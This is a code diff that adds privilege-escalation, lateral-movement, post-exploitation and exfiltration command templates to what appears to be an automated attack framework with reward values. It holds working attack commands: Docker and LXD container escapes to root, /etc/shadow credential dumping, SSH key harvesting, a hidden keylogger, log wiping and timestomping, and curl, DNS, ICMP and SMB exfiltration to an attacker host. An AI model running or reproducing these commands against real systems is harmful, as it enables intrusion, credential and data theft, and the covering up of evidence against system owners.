@@ -1668,6 +1668,415 @@ register(CommandTemplate(
 
 
 # =============================================================================
+# PHASE 3: EXPANDED COMMANDS — PRIVESC / LATERAL / POST / EXFIL
+# =============================================================================
+
+# --- Linux Privilege Escalation (expanded) ---
+register(CommandTemplate(
+    name="find_suid",
+    template="find / -perm -4000 -type f 2>/dev/null",
+    description="Find SUID binaries that may allow privilege escalation.",
+    phase=AttackPhase.PRIVILEGE_ESCALATION,
+    required_params=[],
+    preconditions={"shell_obtained"},
+    success_indicators=["/usr/bin/", "/usr/sbin/", "nmap", "vim", "find", "bash"],
+    typical_reward=5.0,
+    tags={"privesc", "suid", "linux"}
+))
+
+register(CommandTemplate(
+    name="find_sgid",
+    template="find / -perm -2000 -type f 2>/dev/null",
+    description="Find SGID binaries for potential group-based privesc.",
+    phase=AttackPhase.PRIVILEGE_ESCALATION,
+    required_params=[],
+    preconditions={"shell_obtained"},
+    success_indicators=["/usr/bin/", "wall", "ssh-agent"],
+    typical_reward=3.0,
+    tags={"privesc", "sgid", "linux"}
+))
+
+register(CommandTemplate(
+    name="kernel_exploit_check",
+    template="uname -a && cat /etc/os-release",
+    description="Check kernel version and OS for known exploits (DirtyCow, etc).",
+    phase=AttackPhase.PRIVILEGE_ESCALATION,
+    required_params=[],
+    preconditions={"shell_obtained"},
+    success_indicators=["Linux", "Ubuntu", "CentOS", "Debian"],
+    typical_reward=4.0,
+    tags={"privesc", "kernel", "linux"}
+))
+
+register(CommandTemplate(
+    name="cron_check",
+    template="cat /etc/crontab && ls -la /etc/cron.* 2>/dev/null && crontab -l 2>/dev/null",
+    description="Check cron jobs for writable scripts or misconfigurations.",
+    phase=AttackPhase.PRIVILEGE_ESCALATION,
+    required_params=[],
+    preconditions={"shell_obtained"},
+    success_indicators=["root", "* * *", ".sh", "python"],
+    typical_reward=4.0,
+    tags={"privesc", "cron", "linux"}
+))
+
+register(CommandTemplate(
+    name="writable_etc_passwd",
+    template="ls -la /etc/passwd && test -w /etc/passwd && echo 'WRITABLE'",
+    description="Check if /etc/passwd is writable for adding root user.",
+    phase=AttackPhase.PRIVILEGE_ESCALATION,
+    required_params=[],
+    preconditions={"shell_obtained"},
+    success_indicators=["WRITABLE"],
+    typical_reward=6.0,
+    tags={"privesc", "passwd", "linux"}
+))
+
+register(CommandTemplate(
+    name="capability_check",
+    template="getcap -r / 2>/dev/null",
+    description="Find binaries with Linux capabilities for privesc.",
+    phase=AttackPhase.PRIVILEGE_ESCALATION,
+    required_params=[],
+    preconditions={"shell_obtained"},
+    success_indicators=["cap_setuid", "cap_setgid", "cap_sys_admin"],
+    typical_reward=5.0,
+    tags={"privesc", "capabilities", "linux"}
+))
+
+register(CommandTemplate(
+    name="docker_privesc",
+    template="docker run -v /:/host --rm -it alpine chroot /host sh",
+    description="Escape to host via Docker socket if user is in docker group.",
+    phase=AttackPhase.PRIVILEGE_ESCALATION,
+    required_params=[],
+    preconditions={"shell_obtained", "docker_group"},
+    success_indicators=["#", "root"],
+    typical_reward=8.0,
+    tags={"privesc", "docker", "container"}
+))
+
+register(CommandTemplate(
+    name="lxd_privesc",
+    template="lxc init ubuntu:18.04 privesc -c security.privileged=true && lxc config device add privesc host-root disk source=/ path=/mnt/root && lxc start privesc && lxc exec privesc -- /bin/sh",
+    description="LXD/LXC container escape for root access.",
+    phase=AttackPhase.PRIVILEGE_ESCALATION,
+    required_params=[],
+    preconditions={"shell_obtained", "lxd_group"},
+    success_indicators=["root"],
+    typical_reward=8.0,
+    tags={"privesc", "lxd", "container"}
+))
+
+register(CommandTemplate(
+    name="pspy_monitor",
+    template="./pspy64 -p -i 1000",
+    description="Monitor processes without root. Find scheduled tasks and cron activity.",
+    phase=AttackPhase.PRIVILEGE_ESCALATION,
+    required_params=[],
+    preconditions={"shell_obtained"},
+    success_indicators=["CMD:", "UID=0", "cron"],
+    typical_reward=4.0,
+    tags={"privesc", "process", "monitoring"}
+))
+
+# --- Lateral Movement (expanded) ---
+register(CommandTemplate(
+    name="pivot_scan",
+    template="for i in $(seq 1 254); do ping -c 1 -W 1 {subnet}.$i 2>/dev/null | grep 'bytes from' & done; wait",
+    description="Ping sweep internal subnet from compromised host.",
+    phase=AttackPhase.LATERAL_MOVEMENT,
+    required_params=["subnet"],
+    optional_params={"subnet": "10.10.10"},
+    preconditions={"shell_obtained"},
+    success_indicators=["bytes from", "64 bytes"],
+    typical_reward=5.0,
+    tags={"lateral", "pivot", "network"}
+))
+
+register(CommandTemplate(
+    name="nmap_pivot",
+    template="nmap -sS -Pn --top-ports 20 {target}",
+    description="Port scan internal target through pivot host.",
+    phase=AttackPhase.LATERAL_MOVEMENT,
+    required_params=["target"],
+    preconditions={"shell_obtained"},
+    success_indicators=["open", "filtered"],
+    typical_reward=4.0,
+    tags={"lateral", "nmap", "pivot"}
+))
+
+register(CommandTemplate(
+    name="proxychains_scan",
+    template="proxychains nmap -sT -Pn {target} --top-ports 100",
+    description="Scan internal network through SOCKS proxy.",
+    phase=AttackPhase.LATERAL_MOVEMENT,
+    required_params=["target"],
+    preconditions={"socks_proxy_set"},
+    success_indicators=["open", "filtered"],
+    typical_reward=4.0,
+    tags={"lateral", "proxychains", "pivot"}
+))
+
+register(CommandTemplate(
+    name="winrm_exec",
+    template="evil-winrm -i {target} -u {username} -p {password}",
+    description="Get interactive PowerShell via WinRM.",
+    phase=AttackPhase.LATERAL_MOVEMENT,
+    required_params=["target", "username", "password"],
+    preconditions={"winrm_service_found", "credentials_known"},
+    success_indicators=["Evil-WinRM", "PS >"],
+    typical_reward=7.0,
+    tags={"lateral", "winrm", "powershell"}
+))
+
+register(CommandTemplate(
+    name="ssh_lateral",
+    template="ssh {username}@{target}",
+    description="SSH to internal host using harvested credentials.",
+    phase=AttackPhase.LATERAL_MOVEMENT,
+    required_params=["target", "username"],
+    preconditions={"credentials_known", "ssh_service_found"},
+    success_indicators=["$", "#", "Last login"],
+    typical_reward=6.0,
+    tags={"lateral", "ssh"}
+))
+
+# --- Post-Exploitation (expanded) ---
+register(CommandTemplate(
+    name="credential_dump",
+    template="cat /etc/shadow 2>/dev/null || hashdump",
+    description="Dump system credential hashes for offline cracking.",
+    phase=AttackPhase.POST_EXPLOITATION,
+    required_params=[],
+    preconditions={"root_shell_obtained"},
+    success_indicators=["root:", "$6$", "$y$", "::"],
+    typical_reward=10.0,
+    tags={"post", "credentials", "dump"}
+))
+
+register(CommandTemplate(
+    name="hashdump",
+    template="cat /etc/shadow | grep -v '!' | grep -v '*'",
+    description="Extract password hashes from shadow file.",
+    phase=AttackPhase.POST_EXPLOITATION,
+    required_params=[],
+    preconditions={"root_shell_obtained"},
+    success_indicators=["$6$", "$5$", "$1$", "root:"],
+    typical_reward=8.0,
+    tags={"post", "hashes", "linux"}
+))
+
+register(CommandTemplate(
+    name="keylogger_deploy",
+    template="nohup script -q /tmp/.keylog &",
+    description="Deploy basic keylogger to capture terminal input.",
+    phase=AttackPhase.POST_EXPLOITATION,
+    required_params=[],
+    preconditions={"shell_obtained"},
+    success_indicators=["nohup", "started"],
+    typical_reward=4.0,
+    tags={"post", "keylogger", "persistence"}
+))
+
+register(CommandTemplate(
+    name="history_dump",
+    template="cat ~/.bash_history ~/.zsh_history /root/.bash_history 2>/dev/null",
+    description="Dump command history for credentials and patterns.",
+    phase=AttackPhase.POST_EXPLOITATION,
+    required_params=[],
+    preconditions={"shell_obtained"},
+    success_indicators=["ssh", "mysql", "password", "wget"],
+    typical_reward=5.0,
+    tags={"post", "history", "recon"}
+))
+
+register(CommandTemplate(
+    name="network_config_dump",
+    template="ifconfig 2>/dev/null || ip addr && ip route && cat /etc/resolv.conf",
+    description="Dump network configuration for internal network mapping.",
+    phase=AttackPhase.POST_EXPLOITATION,
+    required_params=[],
+    preconditions={"shell_obtained"},
+    success_indicators=["inet", "eth0", "default via"],
+    typical_reward=4.0,
+    tags={"post", "network", "recon"}
+))
+
+register(CommandTemplate(
+    name="ssh_key_harvest",
+    template="find / -name 'id_rsa' -o -name 'id_ed25519' -o -name '*.pem' 2>/dev/null",
+    description="Find SSH private keys for lateral movement.",
+    phase=AttackPhase.POST_EXPLOITATION,
+    required_params=[],
+    preconditions={"shell_obtained"},
+    success_indicators=["id_rsa", "id_ed25519", ".pem"],
+    typical_reward=7.0,
+    tags={"post", "ssh_keys", "lateral"}
+))
+
+register(CommandTemplate(
+    name="cleanup_logs",
+    template="echo '' > /var/log/auth.log && echo '' > /var/log/syslog && history -c",
+    description="Clear system logs and bash history to cover tracks.",
+    phase=AttackPhase.POST_EXPLOITATION,
+    required_params=[],
+    preconditions={"root_shell_obtained"},
+    success_indicators=[""],
+    typical_reward=5.0,
+    tags={"post", "cleanup", "antiforensics"}
+))
+
+register(CommandTemplate(
+    name="timestomp",
+    template="touch -r /etc/hosts {file}",
+    description="Modify file timestamps to match reference file (anti-forensics).",
+    phase=AttackPhase.POST_EXPLOITATION,
+    required_params=["file"],
+    preconditions={"shell_obtained"},
+    success_indicators=[""],
+    typical_reward=3.0,
+    tags={"post", "antiforensics", "timestomp"}
+))
+
+# --- Exfiltration (expanded) ---
+register(CommandTemplate(
+    name="exfil_data",
+    template="tar czf /tmp/.data.tar.gz {path} && curl -X POST -F 'file=@/tmp/.data.tar.gz' http://{attacker}:{port}/upload",
+    description="Archive and exfiltrate target data via HTTP POST.",
+    phase=AttackPhase.EXFILTRATION,
+    required_params=["path", "attacker", "port"],
+    optional_params={"path": "/etc/", "attacker": "10.10.14.1", "port": "8888"},
+    preconditions={"shell_obtained"},
+    success_indicators=["100%", "uploaded"],
+    typical_reward=8.0,
+    tags={"exfil", "http", "archive"}
+))
+
+register(CommandTemplate(
+    name="dns_exfil",
+    template="for line in $(base64 {file} | fold -w 60); do dig $line.{domain} @{dns_server}; done",
+    description="Exfiltrate data via DNS queries (stealthy).",
+    phase=AttackPhase.EXFILTRATION,
+    required_params=["file", "domain", "dns_server"],
+    preconditions={"shell_obtained"},
+    success_indicators=["NOERROR"],
+    typical_reward=6.0,
+    tags={"exfil", "dns", "stealth"}
+))
+
+register(CommandTemplate(
+    name="icmp_exfil",
+    template="xxd -p {file} | while read line; do ping -c 1 -p $line {attacker}; done",
+    description="Exfiltrate data via ICMP ping payloads (very stealthy).",
+    phase=AttackPhase.EXFILTRATION,
+    required_params=["file", "attacker"],
+    preconditions={"shell_obtained"},
+    success_indicators=["bytes from"],
+    typical_reward=5.0,
+    tags={"exfil", "icmp", "stealth"}
+))
+
+register(CommandTemplate(
+    name="base64_exfil",
+    template="base64 {file} | xclip -selection clipboard",
+    description="Base64 encode file for manual exfiltration via clipboard.",
+    phase=AttackPhase.EXFILTRATION,
+    required_params=["file"],
+    preconditions={"shell_obtained"},
+    success_indicators=[""],
+    typical_reward=3.0,
+    tags={"exfil", "base64", "manual"}
+))
+
+register(CommandTemplate(
+    name="smb_exfil",
+    template="smbclient //{attacker}/share -N -c 'put {file}'",
+    description="Exfiltrate file to attacker SMB share.",
+    phase=AttackPhase.EXFILTRATION,
+    required_params=["attacker", "file"],
+    preconditions={"shell_obtained"},
+    success_indicators=["putting file"],
+    typical_reward=5.0,
+    tags={"exfil", "smb"}
+))
+
+
+# =============================================================================
+# PHASE 3 ADDITIONS — Missing Playbook-Referenced Commands
+# =============================================================================
+
+# --- Stealth Recon Commands ---
+register(CommandTemplate(
+    name="nmap_stealth_scan",
+    template="nmap -sS -T2 --max-retries 1 -Pn {target}",
+    description="SYN stealth scan — avoids completing TCP handshake for lower detection.",
+    phase=AttackPhase.RECON,
+    required_params=["target"],
+    success_indicators=["open", "Host is up"],
+    typical_reward=3.0,
+    tags={"recon", "stealth", "nmap"},
+    why="Discovers open ports with minimal detection risk",
+    when="Initial recon when blue team is active or stealth is needed",
+    not_when="Speed is priority and detection is not a concern",
+))
+
+register(CommandTemplate(
+    name="nmap_comprehensive",
+    template="nmap -sC -sV -O -A --top-ports 1000 -T4 {target}",
+    description="Comprehensive nmap scan with scripts, versions, and OS detection.",
+    phase=AttackPhase.RECON,
+    required_params=["target"],
+    success_indicators=["open", "Host is up", "Service Info"],
+    typical_reward=5.0,
+    tags={"recon", "nmap", "thorough"},
+    why="Single scan that provides port, service, version, and OS data",
+    when="When thorough discovery is needed and stealth is not critical",
+))
+
+register(CommandTemplate(
+    name="dns_enum",
+    template="dnsenum --enum {target}",
+    description="DNS enumeration including zone transfer attempts and subdomain brute force.",
+    phase=AttackPhase.RECON,
+    required_params=["target"],
+    success_indicators=["Name Servers", "Zone Transfer", "found"],
+    typical_reward=3.0,
+    tags={"recon", "dns", "enumeration"},
+    why="Discovers subdomains, mail servers, and zone transfer misconfigurations",
+    when="Target has DNS service or when mapping network topology",
+))
+
+register(CommandTemplate(
+    name="whois_lookup",
+    template="whois {target}",
+    description="WHOIS lookup for domain registration and contact information.",
+    phase=AttackPhase.RECON,
+    required_params=["target"],
+    success_indicators=["Registrant", "Name Server", "Creation Date"],
+    typical_reward=2.0,
+    tags={"recon", "osint", "passive"},
+    why="Passive reconnaissance — no direct target interaction",
+    when="Early recon phase to map organization and infrastructure",
+))
+
+# --- Alias for enum4linux used by SMB playbook ---
+register(CommandTemplate(
+    name="enum4linux_scan",
+    template="enum4linux -a {target}",
+    description="Comprehensive SMB/RPC enumeration (alias for enum4linux_full).",
+    phase=AttackPhase.ENUMERATION,
+    required_params=["target"],
+    preconditions={"ports_discovered"},
+    success_indicators=["Users", "Shares", "Password Policy"],
+    typical_reward=6.0,
+    tags={"smb", "enumeration", "rpc"},
+    why="Enumerates users, shares, groups, and password policy over SMB/RPC",
+    when="SMB ports (139/445) found open during recon",
+))
+
+
+# =============================================================================
 # HELPER FUNCTIONS
 # =============================================================================
 
@@ -1745,6 +2154,9 @@ def get_phase_from_state(state: Dict[str, Any]) -> AttackPhase:
         Current AttackPhase
     """
     # Check phases in reverse order (most advanced first)
+    if state.get("data_exfiltrated") or state.get("persistence_established"):
+        return AttackPhase.EXFILTRATION
+    
     if state.get("domain_admin_obtained") or state.get("admin_access_obtained"):
         return AttackPhase.POST_EXPLOITATION
     
